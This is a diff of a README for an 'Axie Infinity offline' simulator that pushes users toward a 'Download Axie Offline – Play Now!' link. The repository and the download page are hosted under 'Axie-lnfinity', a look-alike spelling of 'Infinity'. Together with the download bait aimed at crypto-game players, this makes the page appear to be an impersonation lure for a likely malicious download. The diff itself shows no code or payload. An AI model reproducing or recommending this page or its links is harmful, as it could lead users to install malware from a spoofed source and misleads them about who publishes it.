@@ -5,9 +5,7 @@
 [![Platform Support](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/Axie-lnfinity/axie-infinity)
 [![Discord Community](https://img.shields.io/discord/123456789?color=7289da&label=Discord&logo=discord)](https://discord.gg/axie-community)
 
-> **🎮 Experience Axie Infinity offline! Complete battle simulator, team builder, and strategy tester - no blockchain or internet required.**
-
-![Axie Infinity Banner](https://raw.githubusercontent.com/Axie-lnfinity/axie-infinity/main/assets/axie-banner.gif)
+![Axie Team Builder](https://miro.medium.com/v2/resize:fit:730/1*DfZBtIxV1LtbB_FVgAPlBg.jpeg)  
 
 ## 🎮 Quick Start
 
@@ -15,8 +13,6 @@
 <div align="center">
 
 [![Download Axie Offline](https://img.shields.io/badge/Download%20Axie%20Offline-Play%20Now!-FF6B6B?style=for-the-badge&logo=game-controller&logoColor=white)](https://Axie-lnfinity.github.io/.github)
-
-*Complete offline experience • No registration • No wallet required*
 
 </div>
 
@@ -44,20 +40,6 @@
 - 🎨 **Custom Cards**: Create and test theoretical card combinations
 - 💡 **AI Opponents**: Face adaptive AI that learns from your playstyle
 - 🌐 **No Internet Required**: Everything runs locally on your machine
-
-## 📸 Screenshots & Features
-
-### Battle Interface
-![Battle Screenshot](assets/battle-interface.png)
-*Real-time battle simulation with authentic Axie Infinity mechanics and animations*
-
-### Team Builder
-![Team Builder Screenshot](assets/team-builder.png)
-*Intuitive drag-and-drop interface for creating the perfect Axie team compositions*
-
-### Strategy Analyzer  
-![Analytics Screenshot](assets/analytics.png)
-*Comprehensive statistics and performance tracking for competitive play optimization*
 
 ## 🎮 How to Use
 
